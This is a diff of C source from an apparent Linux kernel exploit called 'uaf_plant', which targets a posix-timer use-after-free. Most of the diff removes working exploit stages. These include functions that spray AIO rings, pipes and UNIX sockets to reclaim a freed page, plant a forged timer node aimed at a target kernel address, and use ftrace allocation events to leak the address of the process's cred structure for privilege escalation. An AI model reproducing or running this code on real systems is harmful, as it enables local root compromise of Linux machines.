@@ -214,8 +214,6 @@ static struct ipc *ipc;
 
 static uint64_t g_all[2200];
 static int g_all_n;
-static int g_pipes[MAX_PIPES][2];
-static int g_npipes;
 static uint64_t *g_ctx;
 static int g_nrings;
 
@@ -393,38 +391,6 @@ static uint64_t object_pfn(uint64_t ptr)
 	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
 }
 
-static uint64_t g_watch[4500];
-static int g_nwatch;
-
-static int cmp_u64(const void *a, const void *b)
-{
-	uint64_t x = *(const uint64_t *)a;
-	uint64_t y = *(const uint64_t *)b;
-	return (x > y) - (x < y);
-}
-
-static void build_watch(void)
-{
-	int w = 0;
-	g_nwatch = 0;
-	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
-		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
-		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
-	}
-	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
-	for (int i = 0; i < g_nwatch; i++) {
-		if (w && g_watch[w - 1] == g_watch[i])
-			continue;
-		g_watch[w++] = g_watch[i];
-	}
-	g_nwatch = w;
-}
-
-static int watch_has(uint64_t pfn)
-{
-	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
-}
-
 static int cpu_count(void);
 
 static int pfn_in_line(const char *line, uint64_t pfn)
@@ -459,14 +425,6 @@ static int trace_seen(const char *kind, uint64_t pfn)
 		fclose(file);
 	}
 	return 0;
-}
-
-static uint64_t parse_pfn(const char *line)
-{
-	const char *p = strstr(line, "pfn=0x");
-	if (!p)
-		return UINT64_MAX;
-	return strtoull(p + 6, NULL, 16);
 }
 
 static int cpu_count(void)
@@ -517,36 +475,6 @@ static int g_nsocks;
 #define DRAIN_SOCKS_TOTAL_MIN  (64UL << 20)
 #define DRAIN_SOCKS_TOTAL_MAX  (8UL << 30)
 
-/**
- * E1/E2 共用：带上下限的环境变量读取，非法值回落默认（clamp 而非报错）。
- * 必须定义在 drain_socks() 之前——否则 C 会按隐式 int 声明处理，
- * 在 LP64 上把 unsigned long 的返回值截断（真机上表现为上限莫名变成小值）。
- */
-static unsigned long env_ul(const char *name, unsigned long def,
-			    unsigned long lo, unsigned long hi)
-{
-	const char *v = getenv(name);
-	char *end = NULL;
-	unsigned long n;
-	if (!v || !*v)
-		return def;
-	n = strtoul(v, &end, 0);
-	if (end == v)
-		return def;
-	if (n < lo)
-		return lo;
-	if (n > hi)
-		return hi;
-	return n;
-}
-
-/** 该 errno 是否表示「资源已打满」的正常终止（而非异常失败）。 */
-static int errno_is_exhausted(int e)
-{
-	return e == ENOSPC || e == EAGAIN || e == EWOULDBLOCK ||
-	       e == EMFILE || e == ENFILE || e == ENOBUFS;
-}
-
 static void close_socks(void)
 {
 	for (int i = 0; i < g_nsocks; i++) {
@@ -556,106 +484,12 @@ static void close_socks(void)
 	g_nsocks = 0;
 }
 
-static unsigned long drain_socks(void)
-{
-	unsigned char buf[65536];
-	unsigned long total = 0;
-	unsigned long cap = env_ul("C98260_DRAIN_SOCKS_MB",
-				   DRAIN_SOCKS_TOTAL_DEF >> 20,
-				   DRAIN_SOCKS_TOTAL_MIN >> 20,
-				   DRAIN_SOCKS_TOTAL_MAX >> 20) << 20;
-	int stop_errno = 0;
-	memset(buf, 0x42, sizeof(buf));
-	g_nsocks = 0;
-	dprintf(STDOUT_FILENO, "[mem_press] cap=%lu MiB\n", cap >> 20);
-	for (int i = 0; i < DRAIN_SOCKS_PAIRS_MAX && total < cap; i++) {
-		int sz = 16 << 20;
-		int wrote = 0;
-		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i])) {
-			stop_errno = errno;
-			break;
-		}
-		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
-		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
-		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
-			stop_errno = errno;
-			close(g_socks[i][0]);
-			close(g_socks[i][1]);
-			break;
-		}
-		while (wrote < (int)DRAIN_SOCKS_PAIR_BYTES) {
-			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
-			if (n < 0) {
-				stop_errno = errno;
-				break;
-			}
-			wrote += (int)n;
-		}
-		if (!wrote) {
-			close(g_socks[i][0]);
-			close(g_socks[i][1]);
-			break;
-		}
-		total += (unsigned long)wrote;
-		g_nsocks++;
-	}
-	dprintf(STDOUT_FILENO, "[mem_press] pairs=%d MiB=%lu%s\n", g_nsocks, total >> 20,
-		stop_errno ? (errno_is_exhausted(stop_errno) ? " (quota)" : " (error)") : "");
-	if (stop_errno && !errno_is_exhausted(stop_errno))
-		dprintf(STDOUT_FILENO, "[mem_press] unexpected errno=%d (%s)\n",
-			stop_errno, strerror(stop_errno));
-	return total;
-}
-
 static int pin_cpu(int cpu)
 {
 	cpu_set_t set;
 	CPU_ZERO(&set);
 	CPU_SET(cpu, &set);
 	return sched_setaffinity(0, sizeof(set), &set);
-}
-
-static unsigned long drain_pipes(void)
-{
-	unsigned char buf[65536];
-	unsigned long total = 0;
-	memset(buf, 0x41, sizeof(buf));
-	g_npipes = 0;
-	int cpus = cpu_count();
-	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
-		int cap, wrote = 0;
-		pin_cpu(i % cpus);
-		if (pipe(g_pipes[i]))
-			break;
-		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
-		if (cap < 0)
-			cap = 65536;
-		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
-			close(g_pipes[i][0]);
-			close(g_pipes[i][1]);
-			break;
-		}
-		while (wrote < cap) {
-			size_t chunk = sizeof(buf);
-			ssize_t n;
-			if (chunk > (size_t)(cap - wrote))
-				chunk = (size_t)(cap - wrote);
-			n = write(g_pipes[i][1], buf, chunk);
-			if (n < 0) {
-				if (errno == EAGAIN)
-					break;
-				close(g_pipes[i][0]);
-				close(g_pipes[i][1]);
-				dprintf(STDOUT_FILENO, "[pipe_drain] write errno=%d\n", errno);
-				return total;
-			}
-			wrote += (int)n;
-			total += (unsigned long)n;
-		}
-		g_npipes++;
-	}
-	dprintf(STDOUT_FILENO, "[pipe_drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
-	return total;
 }
 
 /*
@@ -684,29 +518,6 @@ static uint8_t *raw_buf(size_t need)
 	g_rawbuf = p;
 	g_rawcap = need;
 	return g_rawbuf;
-}
-
-static int read_raw(uint8_t *buf, size_t cap, size_t *used)
-{
-	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
-	if (fd < 0)
-		return -1;
-	alarm(1);
-	while (*used + 4096 < cap) {
-		ssize_t n = read(fd, buf + *used, cap - *used);
-		if (n < 0) {
-			if (errno == EINTR)
-				break;
-			close(fd);
-			return -1;
-		}
-		if (n == 0)
-			break;
-		*used += (size_t)n;
-	}
-	alarm(0);
-	close(fd);
-	return 0;
 }
 
 /*
@@ -846,52 +657,6 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	return (s.out_n > index && s.chosen) ? 0 : -1;
 }
 
-static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
-{
-	/* E3：复用全局 raw 缓冲（4MB 上限）。collect_nth 已改成增量扫描，
-	 * 不再往这块缓冲里灌数据，所以这里自己按需分配即可。 */
-	uint8_t *buf = raw_buf(4U << 20);
-	size_t used = 0;
-	uint8_t needle[8];
-	int n = 0;
-	if (!buf)
-		return -1;
-	memcpy(needle, &site, 8);
-	if (read_raw(buf, 4U << 20, &used))
-		return -1;
-	/* B2 修复：同 collect_nth，needle 即 site，memcmp 已保证相等，got != site
-	 * 恒为假，删除 got 仅保留 req（bytes）与 ptr 内核地址特征过滤。 */
-	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
-		uint64_t ptr, req;
-		if (site && memcmp(buf + i, needle, 8))
-			continue;
-		memcpy(&ptr, buf + i + 8, 8);
-		memcpy(&req, buf + i + 24, 8);
-		if (req != bytes)
-			continue;
-		if ((ptr >> 48) != 0xffff || (ptr & 7))
-			continue;
-		ptrs[n++] = ptr;
-	}
-	/* E3：缓冲由 raw_buf 持有，不在此释放 */
-	return n;
-}
-
-static int text_has_comm(const char *comm)
-{
-	FILE *file = fopen(CPU0_TRACE, "r");
-	char line[768];
-	int n = 0;
-	if (!file)
-		return -1;
-	while (fgets(line, sizeof(line), file)) {
-		if (strstr(line, "do_timer_create") && strstr(line, comm))
-			n++;
-	}
-	fclose(file);
-	return n;
-}
-
 static int prepare_vmas(void)
 {
 	long page = 4096;
@@ -973,7 +738,6 @@ static void *exec_fn(void *arg)
 {
 	struct sigevent event;
 	struct itimerspec spec;
-	timer_t id;
 	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
 	(void)arg;
 	struct sigevent armed_event;
@@ -1094,58 +858,14 @@ static int wait_zombie(pid_t child, int *status_out)
 	return 0;
 }
 
-static int line_has_pfn(const char *line, uint64_t pfn)
-{
-	char exact[40];
-	char *hit;
-	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
-	if (n <= 0)
-		return 0;
-	hit = strstr(line, exact);
-	if (!hit)
-		return 0;
-	{
-		char end = hit[n];
-		if ((end >= '0' && end <= '9') ||
-		    (end >= 'a' && end <= 'f') ||
-		    (end >= 'A' && end <= 'F'))
-			return 0;
-	}
-	return 1;
-}
-
 /* E3 附带清理：原 raw_has_ptr() 没有调用点（死代码），且每 CPU malloc 8MB
  * 逐次全量读 raw，是本文件最重的重复 I/O 来源。删除；若将来需要"某指针是否
  * 出现在 raw trace 中"，用 raw_buf() 复用缓冲重写即可（git 历史里保留原实现）。 */
-
-static int flush_timers(void)
-{
-	struct sigevent event;
-	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
-	int created = 0;
-	if (!ids)
-		return -1;
-	memset(&event, 0, sizeof(event));
-	event.sigev_notify = SIGEV_NONE;
-	for (int i = 0; i < NFLUSH; i++) {
-		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
-			break;
-		created++;
-	}
-	for (int i = 0; i < created; i++)
-		timer_delete(ids[i]);
-	free(ids);
-	dprintf(STDOUT_FILENO, "[timer_flush] deleted=%d\n", created);
-	return created >= 256 ? 0 : -1;
-}
 
 #define MAX_CPU 16
 #define PER_CPU_RINGS 512
 static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
 static int g_cpu_n[MAX_CPU];
-static int g_cpu_lines[MAX_CPU];
-static int g_hit_cpu = -1;
-static int g_hit_index = -1;
 
 static void destroy_rings(void)
 {
@@ -1157,175 +877,7 @@ static void destroy_rings(void)
 	g_nrings = 0;
 }
 
-static void *spray_cpu(void *arg)
-{
-	int cpu = (int)(intptr_t)arg;
-	struct timespec pause = { .tv_nsec = 400000000 };
-	if (pin_cpu(cpu))
-		return NULL;
-	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
-	       g_cpu_n[cpu] < PER_CPU_RINGS) {
-		int batch = 0;
-		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
-			uint64_t ctx = 0;
-			if (syscall(SYS_io_setup, 1, &ctx)) {
-				dprintf(STDOUT_FILENO, "[aio_spray] cpu%d stop errno=%d n=%d\n",
-					cpu, errno, g_cpu_n[cpu]);
-				return NULL;
-			}
-			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
-			batch++;
-		}
-		if (!batch)
-			break;
-		nanosleep(&pause, NULL);
-	}
-	return NULL;
-}
-
-static int reclaim_and_plant(uint64_t victim, uint64_t target)
-{
-	uint64_t node_addr = victim + KITIMER_NODE;
-	uint64_t node_pfn = object_pfn(node_addr);
-	unsigned node_off = (unsigned)(node_addr & 0xfff);
-	pthread_t threads[MAX_CPU];
-	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
-	int shown = 0, victim_frees = 0;
-	uint64_t victim_base;
-	if (node_off + 24 > 4096) {
-		dprintf(STDOUT_FILENO, "[plant_node] node crosses a page off=%#x\n", node_off);
-		return -1;
-	}
-	build_watch();
-	victim_base = node_pfn & ~UINT64_C(1);
-	ncpu = cpu_count();
-	dprintf(STDOUT_FILENO, "[aio_spray] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
-		ncpu, g_nwatch, node_pfn);
-	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
-		return -1;
-	trigger_cmd("enable_event:kmem:mm_page_free\n");
-	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
-	if (trace_off_on() || kick_rss())
-		return -1;
-	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
-	for (int cpu = 0; cpu < ncpu; cpu++) {
-		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
-			ncpu = cpu;
-	}
-	for (int cpu = 0; cpu < ncpu; cpu++)
-		pthread_join(threads[cpu], NULL);
-	write_file(TRACE "/tracing_on", "0\n");
-	for (int cpu = 0; cpu < ncpu; cpu++) {
-		char path[128], line[768];
-		FILE *file;
-		int lines = 0;
-		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-		file = fopen(path, "r");
-		if (!file)
-			continue;
-		while (fgets(line, sizeof(line), file)) {
-			uint64_t pfn = parse_pfn(line);
-			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
-				      strstr(line, "uaf_plant");
-			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
-				free_hits++;
-				if (pfn == victim_base || pfn == node_pfn)
-					victim_frees++;
-				if (shown < 4) {
-					dprintf(STDOUT_FILENO, "[free] %s", line);
-					shown++;
-				}
-			}
-			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
-				alloc_hits++;
-				if (shown < 10) {
-					dprintf(STDOUT_FILENO, "[alloc] %s", line);
-					shown++;
-				}
-			}
-			if (!filemap)
-				continue;
-			if (g_hit_index < 0 && pfn == node_pfn) {
-				g_hit_cpu = cpu;
-				g_hit_index = lines;
-			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
-				other++;
-			lines++;
-		}
-		fclose(file);
-		g_cpu_lines[cpu] = lines;
-		rings += g_cpu_n[cpu];
-		dprintf(STDOUT_FILENO, "[aio_spray] cpu%d rings=%d filemap=%d\n",
-			cpu, g_cpu_n[cpu], lines);
-	}
-	g_nrings = rings;
-	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
-	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
-	    g_hit_index < g_cpu_n[g_hit_cpu]) {
-		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
-		uint64_t *node;
-		if (ring[4] != UINT32_C(0xa10a10a1)) {
-			dprintf(STDOUT_FILENO, "[aio_spray] bad magic %#x\n", ring[4]);
-			return -1;
-		}
-		node = (uint64_t *)((char *)ring + node_off);
-		node[0] = 0;
-		node[1] = 0;
-		node[2] = target;
-		__sync_synchronize();
-		dprintf(STDOUT_FILENO,
-			"[plant_node] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
-			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
-		quiet_reclaim_trace();
-		return 0;
-	}
-	dprintf(STDOUT_FILENO,
-		"[aio_spray] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
-		rings, other, free_hits, alloc_hits, victim_frees);
-	quiet_reclaim_trace();
-	return -1;
-}
-
 static unsigned long *g_hold;
-static int g_nhold;
-static pid_t g_holders[4];
-
-static int hold_aio_children(void)
-{
-	int ready[2];
-	if (pipe(ready))
-		return -1;
-	for (int i = 0; i < 4; i++) {
-		pid_t pid = fork();
-		if (pid < 0)
-			return -1;
-		if (pid == 0) {
-			int n = 0;
-			close(ready[0]);
-			while (n < 20000) {
-				unsigned long ctx = 0;
-				if (syscall(SYS_io_setup, 1, &ctx))
-					break;
-				n++;
-			}
-			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
-				i, n, errno);
-			if (write(ready[1], "x", 1) != 1)
-				_exit(1);
-			for (;;)
-				pause();
-		}
-		g_holders[i] = pid;
-	}
-	close(ready[1]);
-	for (int i = 0; i < 4; i++) {
-		char bit;
-		if (read(ready[0], &bit, 1) != 1)
-			return -1;
-	}
-	close(ready[0]);
-	return 0;
-}
 static int g_nhold;
 
 /* E1：io_setup 数量上下限（默认 70000 = 历史值；上限受 aio-max-nr 约束，
@@ -1334,32 +886,6 @@ static int g_nhold;
 #define DRAIN_AIO_RINGS_MIN 256
 #define DRAIN_AIO_RINGS_MAX 262144
 
-static int drain_aio(void)
-{
-	int cap = (int)env_ul("C98260_DRAIN_AIO_RINGS", DRAIN_AIO_RINGS_DEF,
-			      DRAIN_AIO_RINGS_MIN, DRAIN_AIO_RINGS_MAX);
-	int stop_errno = 0;
-	g_hold = calloc((size_t)cap, sizeof(*g_hold));
-	g_nhold = 0;
-	if (!g_hold)
-		return -1;
-	while (g_nhold < cap) {
-		unsigned long ctx = 0;
-		if (syscall(SYS_io_setup, 1, &ctx)) {
-			stop_errno = errno;
-			break;
-		}
-		g_hold[g_nhold++] = ctx;
-	}
-	dprintf(STDOUT_FILENO, "[aio_hold] rings=%d cap=%d errno=%d%s\n",
-		g_nhold, cap, stop_errno,
-		stop_errno ? (errno_is_exhausted(stop_errno) ? " (quota)" : " (error)") : "");
-	if (stop_errno && !errno_is_exhausted(stop_errno))
-		dprintf(STDOUT_FILENO, "[aio_hold] unexpected errno=%d (%s)\n",
-			stop_errno, strerror(stop_errno));
-	return g_nhold > 1000 ? 0 : -1;
-}
-
 static void free_aio_hold(void)
 {
 	for (int i = 0; i < g_nhold; i++)
@@ -1367,104 +893,6 @@ static void free_aio_hold(void)
 	g_nhold = 0;
 	free(g_hold);
 	g_hold = NULL;
-}
-static int g_catch[1024][2];
-static int g_ncatch;
-
-static int prepare_catch(void)
-{
-	g_ncatch = 0;
-	for (int i = 0; i < 1024; i++) {
-		if (pipe(g_catch[i]))
-			break;
-		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
-			close(g_catch[i][0]);
-			close(g_catch[i][1]);
-			break;
-		}
-		g_ncatch++;
-	}
-	dprintf(STDOUT_FILENO, "[pipe_reclaim] empty=%d\n", g_ncatch);
-	return g_ncatch >= 128 ? 0 : -1;
-}
-
-static int reclaim_pipe(uint64_t victim, uint64_t target)
-{
-	uint64_t node_addr = victim + KITIMER_NODE;
-	uint64_t node_pfn = object_pfn(node_addr);
-	uint64_t victim_base = node_pfn & ~UINT64_C(1);
-	unsigned node_off = (unsigned)(node_addr & 0xfff);
-	unsigned char *page;
-	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
-	if (node_off + 24 > 4096)
-		return -1;
-	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (page == MAP_FAILED)
-		return -1;
-	memset(page, 0, 4096);
-	{
-		uint64_t *node = (uint64_t *)(page + node_off);
-		node[0] = 0;
-		node[1] = 0;
-		node[2] = target;
-	}
-	build_watch();
-	ncpu = cpu_count();
-	dprintf(STDOUT_FILENO, "[pipe_reclaim] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
-		ncpu, node_pfn, node_off);
-	trigger_cmd("enable_event:kmem:mm_page_free\n");
-	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
-	if (trace_off_on() || kick_rss())
-		return -1;
-	for (int i = 0; i < g_ncatch; i++) {
-		int done = 0;
-		if ((i % 32) == 0) {
-			struct timespec pause = { .tv_nsec = 100000000 };
-			pin_cpu((i / 32) % ncpu);
-			if (i)
-				nanosleep(&pause, NULL);
-		}
-		while (done < 4096) {
-			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
-			if (n < 0)
-				break;
-			done += (int)n;
-		}
-		if (done == 4096)
-			wrote_pages++;
-	}
-	write_file(TRACE "/tracing_on", "0\n");
-	for (int cpu = 0; cpu < ncpu; cpu++) {
-		char path[128], line[768];
-		FILE *file;
-		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-		file = fopen(path, "r");
-		if (!file)
-			continue;
-		while (fgets(line, sizeof(line), file)) {
-			uint64_t pfn = parse_pfn(line);
-			if (pfn == UINT64_MAX || !watch_has(pfn))
-				continue;
-			if (strstr(line, "mm_page_free:"))
-				free_hits++;
-			if (!strstr(line, "mm_page_alloc:"))
-				continue;
-			if (pfn != node_pfn && pfn != victim_base)
-				continue;
-			if (strstr(line, "order=0"))
-				order0++;
-			if (strstr(line, "order=1"))
-				order1++;
-			dprintf(STDOUT_FILENO, "[pipe_alloc] %s", line);
-		}
-		fclose(file);
-	}
-	dprintf(STDOUT_FILENO,
-		"[pipe_reclaim] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
-		wrote_pages, free_hits, order0, order1);
-	quiet_reclaim_trace();
-	munmap(page, 4096);
-	return order0 > 0 ? 0 : -1;
 }
 
 static int g_stream[4][2];
@@ -1656,98 +1084,6 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	return hit ? 0 : -1;
 }
 
-static int g_dgram[2] = { -1, -1 };
-
-static int reclaim_dgram(uint64_t victim, uint64_t target)
-{
-	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
-	uint64_t base = node_pfn & ~UINT64_C(1);
-	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
-	unsigned char *buf;
-	int ncpu, sent = 0, hit = 0, big = 8 << 20;
-	int victim_frees = 0, buddy_frees = 0, order2 = 0;
-	uint64_t buddy = base ^ UINT64_C(2);
-	if (node_off + 24 > 4096)
-		return -1;
-	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (buf == MAP_FAILED)
-		return -1;
-	memset(buf, 0, 16000);
-	for (int page = 0; page < 4; page++) {
-		unsigned off = (unsigned)page * 4096u + node_off;
-		uint64_t *node;
-		if (off + 24 > 16000)
-			continue;
-		node = (uint64_t *)(buf + off);
-		node[0] = 0;
-		node[1] = 0;
-		node[2] = target;
-	}
-	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
-		munmap(buf, 16384);
-		return -1;
-	}
-	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
-	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
-	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
-	build_watch();
-	ncpu = cpu_count();
-	dprintf(STDOUT_FILENO, "[dgram_reclaim] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
-		ncpu, node_pfn, node_off);
-	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
-	trigger_cmd("enable_event:kmem:mm_page_free\n");
-	if (trace_off_on() || kick_rss())
-		return -1;
-	for (int i = 0; i < 512; i++) {
-		struct timespec pause = { .tv_nsec = 40000000 };
-		ssize_t n;
-		if ((i % 8) == 0)
-			pin_cpu((i / 8) % ncpu);
-		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
-		if (n == 16000)
-			sent++;
-		else if (i > 16 && sent > 8)
-			break;
-		if ((i % 8) == 7)
-			nanosleep(&pause, NULL);
-	}
-	write_file(TRACE "/tracing_on", "0\n");
-	for (int cpu = 0; cpu < ncpu; cpu++) {
-		char path[128], line[768];
-		FILE *file;
-		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
-		file = fopen(path, "r");
-		if (!file)
-			continue;
-		while (fgets(line, sizeof(line), file)) {
-			uint64_t pfn;
-			pfn = parse_pfn(line);
-			if (pfn == UINT64_MAX)
-				continue;
-			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
-				if (pfn == base)
-					victim_frees++;
-				if (pfn == buddy)
-					buddy_frees++;
-			}
-			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
-				continue;
-			order2++;
-			if (base == pfn || base == pfn + 2) {
-				hit = 1;
-				dprintf(STDOUT_FILENO, "[dgram_reclaim] hit %s", line);
-			}
-		}
-		fclose(file);
-	}
-	dprintf(STDOUT_FILENO,
-		"[dgram_reclaim] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
-		sent, hit, order2, victim_frees, buddy_frees, buddy);
-	quiet_reclaim_trace();
-	munmap(buf, 16384);
-	return hit ? 0 : -1;
-}
-
 static int one_uaf(uint64_t target)
 {
 	struct timespec c0, c1;
@@ -1755,8 +1091,7 @@ static int one_uaf(uint64_t target)
 	clock_gettime(CLOCK_MONOTONIC, &c0);
 	pid_t child;
 	int code, status = 0;
-	uint64_t ptrs[64];
-	int nptr, ntext;
+	int nptr;
 	uint64_t victim;
 	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
@@ -2254,32 +1589,6 @@ static int leak_task(void)
 		freq_dump("sites", sites, nsites);
 	}
 	return hits ? 0 : -1;
-}
-
-static int leak_cred(uint64_t *cred)
-{
-	uint64_t ptrs[8];
-	int n;
-	if (arm_kmem_cache_alloc())
-		return -1;
-	if (trace_off_on())
-		return -1;
-	if (syscall(SYS_setresuid, -1, -1, -1))
-		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
-	write_file(TRACE "/tracing_on", "0\n");
-	{
-		/* site==0 → 只按 req（cred 大小）匹配，不按调用点过滤 */
-		uint64_t csite = SITE_CRED_RT ? SITE_CRED_RT
-					: (STATIC_ANCHOR_TRUSTED ? slide_addr(CRED_LINK) : 0);
-		n = collect_site(csite, CRED_SIZE, ptrs, 8);
-	}
-	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
-	disarm_kmem_cache_alloc();
-	if (n < 1)
-		return -1;
-	*cred = ptrs[n - 1];
-	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
-	return 0;
 }
 
 static void read_enforce(void)
